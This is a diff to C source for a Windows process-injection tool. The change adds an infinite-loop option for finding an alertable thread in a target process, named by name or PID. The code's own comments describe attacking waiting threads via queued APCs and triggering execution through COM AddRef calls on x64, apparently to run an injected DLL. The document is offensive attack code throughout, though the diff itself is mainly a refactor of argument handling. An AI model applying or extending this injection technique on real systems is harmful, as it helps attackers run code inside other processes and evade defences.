@@ -172,7 +172,7 @@ ULONG_PTR       GetGoodDll(__in ULONG   dwSize){
 //trick is quite simple we Queue APC to all threads which are not in DelayExecution state (NtDelayExecution)... I know 
 //we can miss some... but attack only waiting threads except DelayExecution, and check which one has its state changed
 //to DelayExecution... well not perfect but will do the job...
-HANDLE  FindAlertableThread(__in WCHAR  *wsProcessName){
+HANDLE  FindAlertableThread(__in WCHAR  *wsProcessName, __in BOOL infinite_find_alertable){
         PSYSTEM_PROCESS_INFORMATION     pspi, pspi_tmp;
         PSYSTEM_THREAD_INFORMATION      psti;
         DWORD                           dwThreadCount;
@@ -189,7 +189,12 @@ HANDLE  FindAlertableThread(__in WCHAR  *wsProcessName){
         DWORD                           dwPid;
         
         dwPid = _wtoi(wsProcessName);
-        
+
+__loop_forever:
+        if (infinite_find_alertable == TRUE){
+                printf("[*] infinite lookup selected... press Ctrl^C to exit...\n");
+        }
+                
         memset(dwThreads, 0, sizeof(dwThreads));
         
         pspi = pspi_tmp = RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100000);
@@ -281,7 +286,8 @@ __next_pid1:     if (pspi->NextEntryOffset == 0) break;
                         
         }        
 __Exit0:
-        RtlFreeHeap(GetProcessHeap(), 0, pspi_tmp);        
+        RtlFreeHeap(GetProcessHeap(), 0, pspi_tmp); 
+        if (hThread == NULL && infinite_find_alertable == TRUE) goto __loop_forever;       
         return hThread;
 }
 
@@ -317,7 +323,7 @@ int __cdecl wmain(int argc, wchar_t **argv){
         
         ULONG                   rwxDllLen;
 		
-		BOOL infinite_find_alertable = FALSE;
+        BOOL                    infinite_find_alertable = FALSE;
         
         //contrary to x32 where we use QueryInterface to trigger execution, on x64 there are no
         //InterlockedExchangeAdd apis thus all additions can be achived through COM via AddRef
@@ -343,23 +349,22 @@ int __cdecl wmain(int argc, wchar_t **argv){
         memset(wsClassFactoryDllName, 0, sizeof(wsClassFactoryDllName));
         memcpy(wsClassFactoryDllName, pLdrDataTableEntry->BaseDllName.Buffer, pLdrDataTableEntry->BaseDllName.Length);
         
-		do{
-            if (argc >= 2){
-                hThread = FindAlertableThread(argv[1]);
-				if ((!infinite_find_alertable) && (argc >= 3) && (wcslen(argv[2]) >= 2)){
-				    if (_wcsicmp(argv[2], L"-L") == 0) 
-						infinite_find_alertable = TRUE;
-				}
-            }else{
+        if (argc >= 2){
+                if (argc >= 3){
+                        if (!_wcsicmp(argv[2], L"-L"))
+                                infinite_find_alertable = TRUE;                
+                }   
+                hThread = FindAlertableThread(argv[1], infinite_find_alertable);
+        }else{
                 printf("[X] Missing process name or pid...\n");
                 return 1;
-            }       
-            if (hThread == NULL){
-                printf("[X] Failed to find alertable thread... meeh... use -L param for a infinite find and Ctrl^C to exit.\n");
-                if (!infinite_find_alertable)
-					return 1;
-            }
-		} while ((infinite_find_alertable) && (hThread == NULL));
+        }       
+        
+        if (hThread == NULL){
+                printf("[X] Failed to find alertable thread... meeh...\n");
+                printf("[X] use -L param for a infinite find\n");
+                return 1;
+        }
 		
         
         NtQueryInformationThread(hThread, ThreadBasicInformation, &tbi, sizeof(tbi), &dwNeededSize);
